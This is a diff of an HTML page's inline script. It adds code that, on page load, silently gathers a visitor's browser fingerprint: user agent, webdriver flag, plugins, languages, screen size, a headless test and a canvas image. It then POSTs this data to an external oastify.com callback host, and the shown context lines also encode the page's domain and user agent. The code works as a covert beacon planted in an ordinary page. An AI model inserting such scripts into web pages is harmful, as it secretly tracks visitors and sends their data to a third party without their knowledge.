@@ -1,32 +1,70 @@
 
     <script type="text/javascript">
+function getHeadlessInfo() {
+    const userAgent = navigator.userAgent;
+    const isWebDriver = !!(window.navigator.webdriver || window.webdriver || navigator.webdriver);
 
-         var xhr = new XMLHttpRequest();
+    // Browser Plugins
+    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
 
-        // Define the URL to send the request to
-        var url = 'https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/xhr';
+    // Languages
+    const languages = navigator.languages;
 
-        // Configure it: GET-request for the URL
-        xhr.open('GET', url, true);
+    // Screen Dimensions
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
 
-        // Set up a function to handle the response data
-        xhr.onload = function () {
-            if (xhr.status >= 200 && xhr.status < 300) {
-                // This will be called when the request is successful
-                console.log('Response:', xhr.responseText);
-            } else {
-                // This will be called if the request fails
-                console.error('Request failed with status:', xhr.status);
-            }
-        };
+    // Headless Behavior Detection
+    const detectHeadlessBehavior = () => {
+        const element = document.createElement('div');
+        element.style.cssText = 'width:100px;height:100px;overflow:auto;position:absolute;top:-200px;';
+        document.body.appendChild(element);
+        element.scrollTop = 10;
+        const isHeadlessBehavior = element.scrollTop !== 10;
+        document.body.removeChild(element);
+        return isHeadlessBehavior;
+    };
+    const headlessBehaviorDetected = detectHeadlessBehavior();
 
-        // Set up a function to handle network errors
-        xhr.onerror = function () {
-            console.error('Network error');
-        };
+    // Canvas Fingerprinting
+    const detectHeadlessCanvas = () => {
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        context.textBaseline = 'top';
+        context.font = '14px Arial';
+        context.textBaseline = 'alphabetic';
+        context.fillStyle = '#f60';
+        context.fillRect(125, 1, 62, 20);
+        context.fillStyle = '#069';
+        context.fillText('Browser Test', 2, 15);
+        context.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        context.fillText('Browser Test', 4, 17);
+        return canvas.toDataURL();
+    };
+    const canvasDataURL = detectHeadlessCanvas();
 
-        // Send the request
-        xhr.send();
+    return {
+        userAgent,
+        isWebDriver,
+        plugins,
+        languages,
+        screenWidth,
+        screenHeight,
+        headlessBehaviorDetected,
+        canvasDataURL
+    };
+}
+
+function sendHeadlessInfo() {
+    const headlessInfo = getHeadlessInfo();
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/xhr", true);
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send(JSON.stringify(headlessInfo));
+}
+
+sendHeadlessInfo();
+
         // Encode the values to make them URL-safe
         var userAgent = encodeURIComponent(navigator.userAgent);
         var documentDomain = encodeURIComponent(document.domain);
